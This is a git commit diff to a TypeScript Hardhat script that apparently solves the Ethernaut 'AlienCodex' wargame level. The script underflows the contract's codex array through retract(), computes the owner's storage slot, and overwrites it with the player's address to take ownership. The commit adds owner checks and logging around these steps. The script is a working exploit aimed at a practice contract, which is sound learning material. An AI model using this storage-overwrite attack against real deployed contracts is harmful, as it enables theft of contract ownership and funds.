084ed15b7286529f99e8f9624a09222fd93b7ef7
Crys <mariano.christopher123@gmail.com>
2023-01-05 20:43:53 +0800

    optimize aliencodex level

--- scripts/attackAlienCodex.ts
+++ scripts/attackAlienCodex.ts
@@ -1,11 +1,12 @@
 import { AbiCoder } from "@ethersproject/abi";
 import { Wallet } from "ethers";
 import { ethers } from "hardhat";
+import deployAttackMotorbikeEngine from "../deploy/deployAttackMotorbikeEngine";
 
 const attackAlienCodex = async () => {
     // change contract addresses here.
     const alienCodexAddress = "0xF675Be946818f77Ba00aD069C99C97080800656E";
-    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
+    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
 
     // Don't touch below
     // Exploit comes from no check for underflow on retract function and changing storage value for owner
@@ -17,9 +18,19 @@ const attackAlienCodex = async () => {
         "function make_contact()",
         "function retract()",
         "function revise(uint i, bytes32 _content)",
-        "function owner()",
+        {
+            inputs: [],
+            name: "owner",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
+            stateMutability: "nonpayable",
+            type: "function",
+        },
     ];
     const contract = await ethers.getContractAt(ABI, alienCodexAddress);
+    console.log("Checking current owner");
+    let owner = await contract.owner();
+    console.log(`Current owner is: ${owner}`);
+    console.log("Making contact...");
     const tx1 = await contract.make_contact();
     const tx1Receipt = await tx1.wait(1);
     console.log(tx1Receipt);
@@ -28,6 +39,7 @@ const attackAlienCodex = async () => {
     console.log(tx2Receipt);
     // we need to calculate the index where slot for owner is located
     // according to allocation rules, is determined by as keccak256(slot):
+    console.log("Now changing the value of owner after calculating its location in storage...");
     const abi = ethers.utils.defaultAbiCoder;
     const params = abi.encode(["uint256"], [1]);
     const position = await ethers.utils.keccak256(params);
@@ -38,19 +50,20 @@ const attackAlienCodex = async () => {
     // 1             codex.length
     // Use BigInt for mathematical calculations between very large numbers.
     const i = BigInt(2 ** 256) - BigInt(position);
-    const _content = "0x" + "0".repeat(24) + playerAddress.slice(2);
+    const _content = "0x" + "0".repeat(24) + player.slice(2);
     const tx3 = await contract.revise(i, _content);
     const tx3Receipt = await tx3.wait(1);
     console.log(tx3Receipt);
-    // TODO: fix confirmation below
-    // const own = await contract.owner();
-    // const owner = await own.wait(1);
-    // console.log(owner);
-    // const pass = (await contract.owner()) === playerAddress;
-    // console.log(`Claimed ownership and passed this level: ${pass}`);
-    console.log(
-        "Attack done, check if you claimed ownership by typing 'await contract.owner() === player' on ethernaut console, it will show true if you succeeded"
-    );
+    console.log("Rechecking owner...");
+    owner = await contract.owner();
+    console.log(`Current owner is: ${owner}`);
+    if (owner === player) {
+        console.log("Player is now owner!Congrats, Please submit to ethernaut");
+    } else {
+        console.log(
+            "Player is not owner, review code above and try deployAttackMotorbikeEngine..."
+        );
+    }
 };
 
 attackAlienCodex()
